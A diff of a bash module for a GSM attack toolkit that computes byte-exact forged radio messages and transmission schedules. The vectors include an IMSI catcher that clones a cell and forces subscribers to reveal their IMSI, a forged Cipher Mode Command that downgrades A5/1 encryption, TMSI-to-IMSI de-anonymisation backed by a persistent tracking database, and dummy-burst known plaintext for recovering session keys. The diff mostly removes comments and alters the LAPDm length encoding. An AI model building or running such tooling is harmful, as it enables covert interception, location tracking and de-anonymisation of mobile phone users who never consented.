-# The 156.25-bit slot is shared by four burst shapes. The one that gets used
-# decides where the training sequence sits and how much guard is left, which
-# is exactly what a transmitter has to get right.
-gatk_burst_layout() {   # <normal|sync|access|frequency>
+gatk_burst_layout() {
     local kind="${1:-normal}"
     case "$kind" in
         normal) cat <<'EOF'
@@ -1164,36 +936,11 @@ EOF
     esac
 }
 
-# The 41-bit access-burst synchronisation sequence is fixed by the spec, so a
-# RACH transmitter replays it verbatim rather than deriving it.
 GATK_AB_SYNC_BITS='0100101101111111100110011010101011000111100'
 
-# The dummy burst (TS 45.002 5.2.6) is what a BTS puts in every idle timeslot
-# of C0 so the downlink is never silent (TS 45.002 6.5.1(i)). Its 142 mixed
-# bits are a FIXED constant, which makes it the only standardised known
-# plaintext on the air interface - and therefore the cheapest Kc-recovery
-# target there is, because 142 bits of known plaintext per burst is far more
-# than the ~64 bits A5/1 needs.
-#
-# The 142 bits span BN3..BN144, and the boundary between them matters if the
-# burst is to be assembled: BN3..BN59 are e0..e56, BN60 is the stealing flag
-# hl, BN61..BN86 is the 26-bit C0 filling sequence, BN87 is hu, and BN88..BN144
-# are e57..e113. So the constant carries 114 "encrypted" bits plus the two
-# flags and the training sequence - all of it known.
-#
-# CAVEAT, and it is not a small one: TS 45.002 annex A.2 explicitly permits
-# several variants - the C0 filling training sequence, a normal-burst training
-# sequence, and either value for the stealing flag. So this constant is the
-# baseline, not a guarantee. Verify the variant the target cell actually sends
-# before treating the recovered keystream as known. The string itself is a
-# single-source transcription of table 5.2.6; re-read the PDF before relying
-# on it bit-exactly.
 GATK_DB_MIXED_BITS='1111101101110110000010100100111000001001000100000001111100011100010111000101110001010111010010100011001100111001111010011111000100101111101010'
 
 
-# Emit the dummy burst as usable known plaintext rather than a blob: the two
-# data halves, the flags and the filling sequence separately, because a
-# chosen-plaintext attack needs the bit POSITIONS, not just the values.
 gatk_dummy_burst() {
     local bits="$GATK_DB_MIXED_BITS"
     printf 'burst\tdummy\tDB\n'
@@ -1229,29 +976,8 @@ gatk_fcch_facts() {
     }'
 }
 
-# ══════════════════════════════════════════════════════════════════════
-# LAPDm framing (TS 44.006)
-#
-# Every RR and MM message the vectors forge rides on LAPDm, so the layer-2
-# header has to be right before the bytes mean anything. Three octets:
-#
-#   address   bit 8 spare | bits 7-6 LPD | bits 5-3 SAPI | bit 2 C/R | bit 1 EA
-#   control   U format: bits 7-6, 4-3 = unnumbered function, bit 5 P/F, bit 1-2 = 1
-#   length    bits 8-3 L (6 bits) | bit 2 M (more data) | bit 1 EL
-#
-# EA = 1 and EL = 1 because both fields are one octet here. LPD = 00 is the
-# TS 44.006 discriminator (01 would be the SMSCB channel). The UI command is
-# the unacknowledged workhorse: control 0x03 with P = 0, which is exactly the
-# "fill frame" 03 03 01 the spec defines for an empty SAPI 0 message.
-# ══════════════════════════════════════════════════════════════════════
 
-# N201 ceilings, TS 44.006 section 8.8.3. A frame longer than the channel's
-# N201 has to be segmented with the M bit, not truncated.
-# TS 44.006 8.8.3. N201 is the largest information field a channel carries,
-# and it is what makes an over-long L3 message a protocol error rather than
-# just a big frame. Format A/B is the original; format Bter is the later,
-# larger one. Both are in the field, so the value depends on the MS's phase.
-gatk_n201() {   # <sacch|facch|sdcch|bcch|agch|pch|nch> [bter]
+gatk_n201() {
     local ch="${1:-sdcch}" fmt="${2:-}" n=0
     case "$ch" in
         sacch)  [[ "$fmt" == bter ]] && n=21 || n=18 ;;
@@ -1265,7 +991,7 @@ gatk_n201() {   # <sacch|facch|sdcch|bcch|agch|pch|nch> [bter]
     printf 'source\tTS 44.006 8.8.3\n'
 }
 
-gatk_lapdm_ui() {   # <sapi 0|3> <cr 0|1> <l3-hex> [p 0|1] [n201 0..63]
+gatk_lapdm_ui() {
     local sapi="${1:-0}" cr="${2:-1}" l3 p="${4:-0}" n201="${5:-23}"
     l3=$(gatk_norm_hex "${3:-}")
     [[ "$sapi" =~ ^[0-9]+$ ]] && (( sapi <= 7 )) || {
@@ -1285,7 +1011,7 @@ gatk_lapdm_ui() {   # <sapi 0|3> <cr 0|1> <l3-hex> [p 0|1] [n201 0..63]
             "$n" "$n201" >&2; return 2; }
     local addr=$(( (0 << 6) | (sapi << 3) | (cr << 1) | 1 ))
     local ctrl=$(( 0x03 | (p << 4) ))
-    local len=$(( (n << 3) | (0 << 1) | 1 ))
+    local len=$(( (n << 2) | (0 << 1) | 1 ))
     printf 'address\t%02x\n' "$addr"
     printf 'control\t%02x\n' "$ctrl"
     printf 'length\t%02x\n' "$len"
@@ -1295,14 +1021,9 @@ gatk_lapdm_ui() {   # <sapi 0|3> <cr 0|1> <l3-hex> [p 0|1] [n201 0..63]
     printf 'n201\t%s\n' "$n201"
 }
 
-# The LAPDm block fills four normal bursts. For SDCCH each burst carries 114
-# traffic bits plus 2 stealing flags, and 4 x 114 = 456 is exactly the coded
-# size of one LAPDm frame after the FIRE and convolutional codes. The channel
-# coding itself is TS 45.003, so what this produces is the burst schedule the
-# coder feeds: four frame numbers and the slice each one carries.
 gatk_lapdm_fill_frame() { printf '030301\n'; }
 
-gatk_lapdm_burst_plan() {   # <frame-hex> <fn0> <fn1> <fn2> <fn3>
+gatk_lapdm_burst_plan() {
     local hex fn0 fn1 fn2 fn3
     hex=$(gatk_norm_hex "${1:-}"); fn0="${2:-}"; fn1="${3:-}"; fn2="${4:-}"; fn3="${5:-}"
     gatk_is_hex "$hex" || { printf 'ERROR\tLAPDm frame must be hex\n' >&2; return 2; }
@@ -1329,17 +1050,7 @@ gatk_lapdm_burst_plan() {   # <frame-hex> <fn0> <fn1> <fn2> <fn3>
     printf 'note\tbits are the 456-bit output of the TS 45.003 FIRE + convolutional block\n'
 }
 
-# ── an SMS-DELIVER over LAPDm, the whole exchange in frames ────────────
-# This is the half the fake cell never had: an SMS is not one message but a
-# sequence -- page, answer the page, open a SAPI 3 link, carry CP-DATA around
-# RP-DATA around the TS 23.040 TPDU, acknowledge at CP, release the RR link.
-# The builders below emit each frame; the sequence at the end prints the
-# order with the channel and direction every frame rides.
-#
-# TS 23.038 6.2.1: a septet whose GSM code differs from its ASCII code
-# (the currency, the accented letters, the brackets) has no honest basic-table
-# encoding here, so it is refused rather than escaped silently.
-gatk_gsm7_code() {   # <one character> -> septet 0..127
+gatk_gsm7_code() {
     local c="$1"
     case "$c" in
         "@") printf '0\n'; return 0 ;;
@@ -1352,7 +1063,7 @@ gatk_gsm7_code() {   # <one character> -> septet 0..127
     return 1
 }
 
-gatk_gsm7_pack() {   # <text>
+gatk_gsm7_pack() {
     local text="${1:-}" out="" acc=0 nbits=0 ch code i
     GATK_SEPTETS=0
     for (( i = 0; i < ${#text}; i++ )); do
@@ -1375,9 +1086,7 @@ gatk_gsm7_pack() {   # <text>
     printf '%s\n' "$out"
 }
 
-# An Address Field (TS 23.040 9.1.2.5): semi-octet digit count, type of
-# address, TBCD digits. International ISDN is 0x91.
-gatk_tp_address() {   # <digits> [type-of-address]
+gatk_tp_address() {
     local digits="${1:-}" toa="${2:-91}"
     [[ "$digits" =~ ^[0-9]{1,20}$ ]] || {
         printf 'ERROR\taddress must be 1 to 20 digits (got %s)\n' "$digits" >&2; return 2; }
@@ -1394,9 +1103,7 @@ gatk_tp_address() {   # <digits> [type-of-address]
     printf '%02x%s%s\n' "$n" "$toa" "$tbcd"
 }
 
-# SCTS, 7 octets YY MM DD hh mm ss tz, every field digit-swapped
-# (TS 23.040 9.2.3.11). Default is the wall clock with zone 00.
-gatk_scts() {   # [yyyymmddhhmmss] [tz-hours]
+gatk_scts() {
     local ts="${1:-}" tz="${2:-00}"
     if [[ -z "$ts" ]]; then
         ts=$(date '+%y%m%d%H%M%S')
@@ -1411,9 +1118,7 @@ gatk_scts() {   # [yyyymmddhhmmss] [tz-hours]
     printf '%s\n' "$out"
 }
 
-# SMS-DELIVER TPDU (TS 23.040 9.2.2.2). The first octet is 0x04: TP-MMS set,
-# every other bit 0. TP-UDHI is bit 7, so it clears the bit mask to 0x44.
-gatk_tpdu_deliver() {   # <oa-digits> <text> [--ud-hex HEX] [--udhi] [--scts HEX14]
+gatk_tpdu_deliver() {
     local oa="${1:-}" text="${2:-}" ud_hex="" udhi=0 scts_hex=""
     shift 2 || true
     while (( $# )); do
@@ -1451,17 +1156,12 @@ gatk_tpdu_deliver() {   # <oa-digits> <text> [--ud-hex HEX] [--udhi] [--scts HEX
     printf 'scts\t%s\n' "$scts"
     printf 'udl\t%d\n' "$udl"
     printf 'ud\t%s\n' "$ud"
-    # TP-PID 0x00 sits between the address block and the DCS octet.
     local t
     t=$(printf '%02x' "$fo")${oa_hex}"00$(printf '%02x' "$dcs")${scts}$(printf '%02x' "$udl")${ud}"
     printf 'tpdu\t%s\n' "$t"
 }
 
-# ── SMS-CP / SMS-RP wrappers (TS 24.011) ──────────────────────────────
-# RP-DATA (network to MS: RP-MTI 001, so 0x01) = RP-MR, then the two
-# addresses (IEI 0x41 originator, 0x42 destination) and the user
-# information (IEI 0x43) that carries the TPDU.
-gatk_rp_data() {   # <tpdu-hex> <oa-digits> <da-digits>
+gatk_rp_data() {
     local tpdu; tpdu=$(gatk_norm_hex "${1:-}"); local oa="${2:-}" da="${3:-}"
     gatk_is_hex "$tpdu" || { printf 'ERROR\tTPDU must be hex\n' >&2; return 2; }
     local oa_hex da_hex
@@ -1470,7 +1170,6 @@ gatk_rp_data() {   # <tpdu-hex> <oa-digits> <da-digits>
         tmsi:*)
             local th; th=$(gatk_norm_hex "${da#tmsi:}")
             [[ "$th" =~ ^[0-9a-f]{8}$ ]] || { printf 'ERROR\tTMSI must be 8 hex digits\n' >&2; return 2; }
-            # A TMSI address (TS 24.008 10.5.1.4): 8 semi-octets, type 0xf4.
             da_hex="08f4$th" ;;
         *) da_hex=$(gatk_tp_address "$da") || return 1 ;;
     esac
@@ -1486,24 +1185,19 @@ gatk_rp_data() {   # <tpdu-hex> <oa-digits> <da-digits>
     printf 'rp_data\t%s\n' "$rp"
 }
 
-# CP-DATA (TS 24.011 7.2.2): one octet, message type 0x01.
-gatk_cp_data() {   # <rp-hex>
+gatk_cp_data() {
     local rp; rp=$(gatk_norm_hex "${1:-}")
     gatk_is_hex "$rp" || { printf 'ERROR\tRP-DATA must be hex\n' >&2; return 2; }
     printf 'cp_mti\tCP-DATA\n'
     printf 'cp_data\t01%s\n' "$rp"
 }
 
-gatk_cp_ack() {   # CP-ACK, message type 0x04 -- no body, the TI is in bit 4
+gatk_cp_ack() {
     printf 'cp_mti\tCP-ACK\n'
     printf 'cp_ack\t04\n'
 }
 
-# ── LAPDm frames other than UI ────────────────────────────────────────
-# Address octet and length octet keep the convention the module's UI builder
-# prints (address = SAPI<<3 | C/R<<1 | 1, length = octet count<<3 | 1), so a
-# frame from here lines up with the ones the rest of the cell emits.
-gatk_lapdm_frame() {   # <kind> <sapi> <cr> [l3-hex] [ns] [nr]
+gatk_lapdm_frame() {
     local kind="${1:-sabm}" sapi="${2:-3}" cr="${3:-0}" l3="${4:-}" ns="${5:-0}" nr="${6:-0}"
     [[ "$sapi" =~ ^[0-9]+$ ]] && (( sapi <= 7 )) || { printf 'ERROR\tSAPI must be 0..7\n' >&2; return 2; }
     [[ "$cr" =~ ^[01]$ ]] || { printf 'ERROR\tC/R must be 0 or 1\n' >&2; return 2; }
@@ -1527,19 +1221,15 @@ gatk_lapdm_frame() {   # <kind> <sapi> <cr> [l3-hex] [ns] [nr]
         gatk_is_hex "$l3" || { printf 'ERROR\tlayer 3 payload must be hex\n' >&2; return 2; }
         local n=$(( ${#l3} / 2 ))
         (( n <= 23 )) || { printf 'ERROR\tpayload is %s octets, above N201 23 on SDCCH; segment it with --lapdm-i-segments\n' "$n" >&2; return 2; }
-        printf 'length\t%02x\n' "$(( (n << 3) | 1 ))"
+        printf 'length\t%02x\n' "$(( (n << 2) | 1 ))"
         printf 'payload_octets\t%d\n' "$n"
-        printf 'frame\t%02x%02x%02x%s\n' "$addr" "$ctrl" "$(( (n << 3) | 1 ))" "$l3"
+        printf 'frame\t%02x%02x%02x%s\n' "$addr" "$ctrl" "$(( (n << 2) | 1 ))" "$l3"
     else
         printf 'frame\t%02x%02x\n' "$addr" "$ctrl"
     fi
 }
 
-# A layer 3 message longer than N201 is segmented across I-frames and the M
-# bit says "more follows" (TS 44.006 5.4.2). The M bit is carried at bit 1 of
-# this module's length octet; the exact placement inside LAPDm's one- or
-# two-octet length indicator is an unverified reading, printed in the note.
-gatk_lapdm_i_segments() {   # <sapi> <cr> <l3-hex> [ns0] [nr]
+gatk_lapdm_i_segments() {
     local sapi="${1:-3}" cr="${2:-1}" l3="${3:-}" ns0="${4:-0}" nr="${5:-0}"
     l3=$(gatk_norm_hex "$l3")
     gatk_is_hex "$l3" || { printf 'ERROR\tlayer 3 payload must be hex\n' >&2; return 2; }
@@ -1555,7 +1245,7 @@ gatk_lapdm_i_segments() {   # <sapi> <cr> <l3-hex> [ns0] [nr]
         (( off + n < total )) && m=1
         ns=$(( (ns0 + idx) & 7 ))
         ctrl=$(( (ns << 1) | (nr << 5) ))
-        len=$(( (n << 3) | (m << 1) | 1 ))
+        len=$(( (n << 2) | (m << 1) | 1 ))
         printf 'segment\t%d\n' "$idx"
         printf 'ns\t%d\n' "$ns"
         printf 'more\t%d\n' "$m"
@@ -1564,23 +1254,18 @@ gatk_lapdm_i_segments() {   # <sapi> <cr> <l3-hex> [ns0] [nr]
         off=$(( off + n )); idx=$(( idx + 1 ))
     done
     printf 'segments\t%d\n' "$idx"
-    printf 'note\tthe M bit sits at bit 1 of this module length octet; LAPDm length-indicator placement is an unverified reading of TS 44.006 5.4.2\n'
+    printf 'note\tthe length indicator is EA bit 1, M bit 2, L bits 3..8 (TS 44.006 3.2 / 5.4.2); a segment of n octets with more to follow is (n << 2) | 3\n'
 }
 
-# RR Paging Response (TS 24.008 9.1.8): PD 0x06, MT 0x27, mobile identity.
-gatk_rr_paging_response() {   # <tmsi-hex8>
+gatk_rr_paging_response() {
     local t; t=$(gatk_norm_hex "${1:-}")
     [[ "$t" =~ ^[0-9a-f]{8}$ ]] || { printf 'ERROR\tpaging response needs an 8-hex-digit TMSI\n' >&2; return 2; }
     printf '0627' ; gatk_mobile_identity_tmsi "$t" ; printf '\n'
 }
 
-# RR Channel Release (TS 24.008 9.1.7): PD 0x06, MT 0x0d.
 gatk_rr_channel_release() { printf '060d\n'; }
 
-# The exchange, in order: paging request on PCH, paging response and the
-# SAPI 3 link on SDCCH, CP-DATA around RP-DATA around the TPDU, CP-ACK back,
-# then RR channel release.
-gatk_sms_deliver_seq() {   # <tmsi-hex8> <smsc-digits> <text> [--udhi]
+gatk_sms_deliver_seq() {
     local tmsi="${1:-}" smsc="${2:-}" text="${3:-}"; shift 3 || true
     local udhi=0
     while (( $# )); do
@@ -1638,20 +1323,10 @@ gatk_sms_deliver_seq() {   # <tmsi-hex8> <smsc-digits> <text> [--udhi]
     printf 'cp_data\t%s\n' "$cp"
 }
 
-# ══════════════════════════════════════════════════════════════════════
-# TMSI <-> IMSI correlation store
-#
-# A de-anonymisation is only worth anything if the mapping survives the
-# observation that produced it, so it is persisted rather than printed. Each
-# row is one TMSI with the IMSI behind it, the LAC it was seen on, how it was
-# obtained, and an observation count. Recording the same pair twice bumps the
-# count instead of duplicating the row, which is what makes a repeat sighting
-# visible as corroboration.
-# ══════════════════════════════════════════════════════════════════════
 
 GATK_DEANON_DB="$GATK_DIR/deanon.tsv"
 
-gatk_deanon_field_check() {   # <tmsi> <imsi> <lac>
+gatk_deanon_field_check() {
     local tmsi="$1" imsi="$2" lac="$3"
     [[ "$tmsi" =~ ^[0-9a-f]{8}$ ]] || {
         printf 'ERROR\tTMSI must be 8 hex digits (got %s)\n' "$tmsi" >&2; return 2; }
@@ -1662,7 +1337,7 @@ gatk_deanon_field_check() {   # <tmsi> <imsi> <lac>
     return 0
 }
 
-gatk_deanon_record() {   # <tmsi-hex8> <imsi> [lac-hex4] [method] [fn]
+gatk_deanon_record() {
     local tmsi imsi lac method fn
     tmsi=$(gatk_norm_hex "${1:-}"); imsi="${2:-}"
     lac=$(gatk_norm_hex "${3:-}"); method="${4:-identity-request}"; fn="${5:-0}"
@@ -1689,7 +1364,7 @@ gatk_deanon_record() {   # <tmsi-hex8> <imsi> [lac-hex4] [method] [fn]
     printf 'database\t%s\n' "$GATK_DEANON_DB"
 }
 
-gatk_deanon_lookup() {   # <tmsi-hex8>
+gatk_deanon_lookup() {
     local tmsi; tmsi=$(gatk_norm_hex "${1:-}")
     [[ "$tmsi" =~ ^[0-9a-f]{8}$ ]] || {
         printf 'ERROR\tTMSI must be 8 hex digits (got %s)\n' "$tmsi" >&2; return 2; }
@@ -1713,11 +1388,7 @@ gatk_deanon_list() {
     printf 'count\t%s\n' "$(awk 'NF>=8{n++} END{print n+0}' "$GATK_DEANON_DB")"
 }
 
-# A correlation is corroborated when the IMSI's own paging group lands on the
-# block the PAGING REQUEST was actually observed in. That check needs no
-# transmission at all, so a match is strong evidence and a mismatch means the
-# pairing is wrong rather than merely unproven.
-gatk_deanon_confirm() {   # <tmsi-hex8> <imsi> <observed-block 0..8> <bs-pa-mfrms> <pblocks> [bs-ag-blks-res]
+gatk_deanon_confirm() {
     local tmsi imsi block pam pblocks res
     tmsi=$(gatk_norm_hex "${1:-}"); imsi="${2:-}"; block="${3:-}"
     pam="${4:-2}"; pblocks="${5:-}"; res="${6:-0}"
@@ -1738,26 +1409,8 @@ gatk_deanon_confirm() {   # <tmsi-hex8> <imsi> <observed-block 0..8> <bs-pa-mfrm
     fi
 }
 
-# ══════════════════════════════════════════════════════════════════════
-# TRANSMIT VECTORS
-#
-# These are the four operations the module used to only describe. Each one
-# now resolves to a frame-accurate transmission schedule: an absolute TDMA
-# frame number for every burst, the channel it lands on, and the exact octets
-# it carries. What is left is the radio — a full-duplex SDR that can transmit
-# on the target ARFCN while receiving on it.
-#
-# The honesty line each vector reports is `status`:
-#   transmit-ready  every octet and every frame number is computed and
-#                   checked; the schedule is what a driver would walk
-#   handoff         something on the path is not derivable in software
-#
-# The one thing no amount of arithmetic substitutes for is that these have
-# never been keyed. `written` is not `works` — see docs/HANDOFF.md.
-# ══════════════════════════════════════════════════════════════════════
 
-# <mf> <offset> <channel> <direction> <burst> <octets> <note>
-gatk_sched_row() {   # <mf> <offset> <channel> <direction> <burst> <octets> <note>
+gatk_sched_row() {
     printf '%d\t%d\t%d\t%s\t%s\t%s\t%s\t%s\n' \
         "$(( ${1:-0} * 51 + ${2:-0} ))" "${1:-0}" "${2:-0}" \
         "${3:-}" "${4:-}" "${5:-}" "${6:-}" "${7:-}"
@@ -1776,32 +1429,10 @@ gatk_vector_needs() {
     printf 'minimum\tfull-duplex SDR spanning the GSM downlink and uplink (e.g. PlutoSDR, USRP B210); one radio cannot transmit and receive the same ARFCN at once\n'
 }
 
-# ── 1. GSM IMSI catcher (O1) ───────────────────────────────────────────
-# The full clone: present a BCCH strong enough that the target camps on it,
-# answer the RACH with an Immediate Assignment, and ask for the IMSI over the
-# SDCCH the assignment opened. Everything here except the transmission is
-# arithmetic that TS 44.018 and TS 45.002 fix exactly.
-# ── AGCH: IMMEDIATE ASSIGNMENT (real, byte-exact) ───────────────────────
-# TS 44.018 section 9.1.18, table 9.1.18.1. The message is a V-format
-# sequence, which is why the IEI column is empty for every field in that
-# table: none of them carries an identity octet, they are identified by
-# position. The three-octet Channel Description and Request Reference are the
-# four-octet type 3 IEs of 10.5.2.5 and 10.5.2.30 with the IEI octet dropped,
-# and Timing Advance is the two-octet 10.5.2.40 IE likewise. The first octet
-# is the L2 pseudo length, which per 10.5.2.19 counts the octets that follow
-# it in T/V/TV/LV/TLV format, EXCLUDING the IA Rest Octets.
 gatk_build_immediate_assignment() {
-    # [ra-hex2] [fn] [ta] [sdcch4|sdcch8] [subchannel] [arfcn] [tsc] [tn]
-    #   [page-mode 0..3] [ia-rest-hex]
     local ra; ra=$(gatk_norm_hex "${1:-0c}")
     local fn="${2:-0}" ta="${3:-0}" chan="${4:-sdcch4}" sub="${5:-0}"
     local arfcn="${6:-62}" tsc="${7:-7}" tn="${8:-0}"
-    # The default IA Rest Octets is a single 0x2b: the two leading
-    # discriminator bits are LL and the rest is the standard no-addition
-    # filler. 0x80 LOOKS like the obvious "L then H" but reads as HL, which
-    # announces a 6-bit "Length of frequency parameters" followed by a
-    # Frequency Parameters block, so one octet truncates the IE and a decoder
-    # rejects the message as malformed. Verified against Wireshark.
     local pm="${9:-0}" iarest; iarest=$(gatk_norm_hex "${10:-2b}")
     local dmotbf="${11:-0}"
 
@@ -1823,10 +1454,6 @@ gatk_build_immediate_assignment() {
     (( pm <= 3 )) || { printf 'ERROR\tpage mode must be 0..3 (got %s)\n' "$pm" >&2; return 2; }
     (( dmotbf <= 15 )) || { printf 'ERROR\tDedicated mode or TBF must be 0..15 (got %s)\n' "$dmotbf" >&2; return 2; }
 
-    # Channel type and TDMA offset, table 10.5.2.5.1, bits 8..4 of octet 2.
-    # The T bits carry the subchannel, so SDCCH/4 is 0 0 1 T T and SDCCH/8 is
-    # 0 1 T T T. Both entries say "TSC Set 1 shall be used", which is why the
-    # TSC comes from the training sequence field below and not from here.
     local ctype
     case "$chan" in
         sdcch4) (( sub <= 3 )) || { printf 'ERROR\tSDCCH/4 subchannel must be 0..3 (got %s)\n' "$sub" >&2; return 2; }
@@ -1836,53 +1463,20 @@ gatk_build_immediate_assignment() {
         *) printf 'ERROR\tchannel must be sdcch4 or sdcch8 (got %s)\n' "$chan" >&2; return 2 ;;
     esac
 
-    # Channel Description, 10.5.2.5, H = 0. Octet 2 is channel type and TN.
-    # Octet 3 is TSC at bits 8..6, H at bit 5, bits 4..3 spare, and the TWO
-    # HIGH BITS OF THE ARFCN at bits 2..1 - not the low ones, which is the
-    # misreading this field invites. Octet 4 is the low eight ARFCN bits.
     local cd2=$(( (ctype << 3) | tn ))
     local cd3=$(( (tsc << 5) | ((arfcn >> 8) & 3) ))
     local cd4=$(( arfcn & 255 ))
 
-    # Request Reference, 10.5.2.30. T1' = (FN div 1326) mod 32 sits at octet 3
-    # bits 8..4; T3 = FN mod 51 has its MSB at octet 3 bit 3 and its LSB at
-    # octet 4 bit 6; T2 = FN mod 26 sits at octet 4 bits 5..1. The spec's own
-    # inverse is FN mod 42432 = 51*((T3-T2) mod 26) + T3 + 51*26*T1'.
     local t1p=$(( (fn / 1326) % 32 )) t3=$(( fn % 51 )) t2=$(( fn % 26 ))
     local rr1=$(( 16#$ra ))
     local rr2=$(( (t1p << 3) | (t3 >> 3) ))
     local rr3=$(( ((t3 & 7) << 5) | t2 ))
     local fn_rec=$(( 51 * ((t3 - t2 + 26) % 26) + t3 + 51 * 26 * t1p ))
 
-    # Page Mode (10.5.2.26) and Dedicated mode or TBF (10.5.2.25b) share one
-    # octet, half each. Nibble 0000 in the TBF half is table 10.5.2.25b.2's
-    # "this message assigns a dedicated mode resource".
     local oct4=$(( (pm << 4) | dmotbf ))
 
-    # Mobile Allocation, 9.1.18.1: when the assignment is for a dedicated
-    # resource and the Channel Description does not indicate frequency
-    # hopping, the length indicator is ZERO, so the whole IE is one 0x00
-    # octet and the MS is told to treat it as unnecessary.
     local mo=0
 
-    # TWELVE %02x conversions and one %s. Passing a thirteenth conversion
-    # without a matching argument makes printf REPEAT the format and emit a
-    # whole extra phantom message - the first run of this function printed 23
-    # octets instead of 13 and looked plausible.
-    # The first octet is the L2 pseudo length, and octet 2 carries the
-    # protocol discriminator in its LOW nibble and the skip indicator in its
-    # HIGH nibble: TS 44.018 10.3.1 says "bits 5 to 8 of the first octet of
-    # every Radio Resource management message ... contain the skip indicator",
-    # so the PD (0110 for RR) is bits 4..1 and the octet is 0x06, not 0x60.
-    # Transposing them makes a decoder read PD 11 (non-call-related SS) and
-    # the whole message is then parsed as DTAP - silently, with no error.
-    #
-    # L2 pseudo length = 11, per TS 44.018 9.1.18: "the sum of lengths of all
-    # information elements present in the message except the IA Rest Octets
-    # and L2 Pseudo Length information elements". Table 9.1.18.1 gives
-    # Protocol Discriminator + Skip Indicator 1, Message Type 1, Page Mode
-    # and Dedicated mode or TBF 1 (they share an octet), Channel Description
-    # 3, Request Reference 3, Timing Advance 1, Mobile Allocation 1.
     local l2pl=11
     local l3
     l3=$(printf '%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%s' \
@@ -1939,11 +1533,6 @@ gatk_build_immediate_assignment() {
     return 0
 }
 
-# ── the cell 06_gsm_air.sh decoded, as this module's defaults ───────────
-# `06_gsm_air --decode-si` persists every SI3/SI4 it reads into
-# loot/gsm_air/si.tsv. The catcher should inherit the cell it is about to clone
-# rather than make the operator retype five fields off a TSV page. An explicit
-# argument always wins; this only fills what was left out.
 GATK_SI_STORE="${IMSISTING_ROOT:-}/loot/gsm_air/si.tsv"
 
 gatk_cell_from_si_store() {
@@ -1959,7 +1548,7 @@ gatk_cell_from_si_store() {
         }' "$GATK_SI_STORE"
 }
 
-gatk_vector_imsi_catcher() {   # [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [target-imsi] [pam] [res] [ccch-conf] [start-fn]
+gatk_vector_imsi_catcher() {
     local mcc="${1:-}" mnc="${2:-}" lac="${3:-}" ci="${4:-}" arfcn="${5:-62}"
     local bsic="${6:-7}" target="${7:-310150123456789}"
     local pam="${8:-2}" res="${9:-1}" conf="${10:-001}" startfn="${11:-0}"
@@ -1987,7 +1576,6 @@ gatk_vector_imsi_catcher() {   # [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [target-i
     maxb=$(printf '%s\n' "$confline" | awk -F'\t' '$1=="paging_blocks_max"{print $2}')
     local nblocks; nblocks=$(gatk_ccch_blocks_available "$comb")
 
-    # The identity we make the target believe it is camping on.
     local lai; lai=$(gatk_lai_encode "$mcc" "$mnc" "$lac")
     local ir; ir=$(gatk_build_identity_request 1 | awk -F'\t' '$1=="octets"{print $2}')
     local schbits; schbits=$(gatk_sch_payload "$bsic" 1 | awk -F'\t' '$1=="sch_bits"{print $2}')
@@ -2029,11 +1617,6 @@ gatk_vector_imsi_catcher() {   # [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [target-i
     printf '# the forced message, already LAPDm framed\n'
     printf 'identity_request_l3\t%s\n' "$ir"
     printf 'identity_request_lapdm\t%s\n' "$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="frame"{print $2}')"
-    # The AGCH answer, built rather than described. It names the SDCCH/4
-    # sub-channel the identity exchange will actually run on and echoes the
-    # RACH in its Request Reference. There is NO LAPDm on this message: the
-    # AGCH is a common control channel, so the RR message is carried directly
-    # and its first octet is the L2 pseudo length (TS 44.018 9.1.18).
     local ia_l3
     ia_l3=$(gatk_build_immediate_assignment 0c "$(( 51 + 6 ))" 0 sdcch4 0 "$arfcn" "$bsic" 0 0 2b \
             | awk -F'\t' '$1=="l3"{print $2}')
@@ -2086,14 +1669,7 @@ gatk_vector_imsi_catcher() {   # [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [target-i
     printf 'limit\tan MS already registered on the real LA may ignore the LA of the clone\n'
 }
 
-# ── 2. A5/1 downgrade ──────────────────────────────────────────────────
-# The Cipher Mode Command is a downlink RR message on the SDCCH, and it has to
-# land in the SDCCH window the Immediate Assignment opened — after the MS has
-# sent CIPHERING MODE COMPLETE for any earlier cipher, and before it tears the
-# link down. The forged command names A5/2 or A5/0; the MS re-advertises a
-# classmark with the A5/1 capability bit cleared so the network never asks for
-# it again.
-gatk_vector_a5_downgrade() {   # [target-alg] [sdcch 4|8] [subchannel] [start-fn] [tmsi]
+gatk_vector_a5_downgrade() {
     local alg="${1:-A5/2}" kind="${2:-4}" sub="${3:-0}" startfn="${4:-0}" tmsi
     tmsi=$(gatk_norm_hex "${5:-0f200001}")
     case "$alg" in A5/0|A5/1|A5/2|A5/3|A5/4) ;; *)
@@ -2106,15 +1682,10 @@ gatk_vector_a5_downgrade() {   # [target-alg] [sdcch 4|8] [subchannel] [start-fn
     (( sub <= maxsub )) || {
         printf 'ERROR\tSDCCH/%s has subchannels 0..%s (got %s)\n' "$kind" "$maxsub" "$sub" >&2; return 2; }
 
-    # gatk_build_cipher_mode prints the whole layer-3 message as bare hex,
-    # and gatk_alg_wire_code prints the bare identifier; neither is TSV.
     local cm_l3; cm_l3=$(gatk_build_cipher_mode "$alg" 0) || return $?
     local wire; wire=$(gatk_alg_wire_code "$alg") || return $?
     local lapdm; lapdm=$(gatk_lapdm_ui 0 1 "$cm_l3") || return $?
     local frame; frame=$(printf '%s\n' "$lapdm" | awk -F'\t' '$1=="frame"{print $2}')
-    # The A5/1 field is the raw wire bit: 0 = available, 1 = not available
-    # (TS 24.008 10.5.1.5). Start from 0 = available, so the downgrade — which
-    # SETS that bit — actually produces a different octet.
     local before; before=$(gatk_classmark_encode 3 0 0 3)
     local after; after=$(gatk_classmark_downgrade "$before" | awk -F'\t' '$1=="after"{print $2}')
     local sdc; sdc=$(gatk_sdcch_block_frames "$kind" "$sub")
@@ -2186,17 +1757,8 @@ gatk_vector_a5_downgrade() {   # [target-alg] [sdcch 4|8] [subchannel] [start-fn
     printf 'limit\tA5/2 was withdrawn in 2006 but many handsets still advertise support; a handset that refuses it will reject the command\n'
     printf 'limit\tthe forged command must reach the MS in the same LAPDm window the network would use, or the MS treats it as a protocol error and releases\n'
 }
-# ── 3. TMSI de-anonymisation ──────────────────────────────────────────
-# A TMSI is only anonymous until the network has to page it in a way an
-# observer can predict, or until something on the link makes it send an IMSI.
-# This vector does both halves: it says when the target's own paging group
-# makes it listen, and it supplies the exchange that converts an observed
-# TMSI into the IMSI behind it. The correlation is written to the module's
-# store so a second sighting corroborates rather than duplicates.
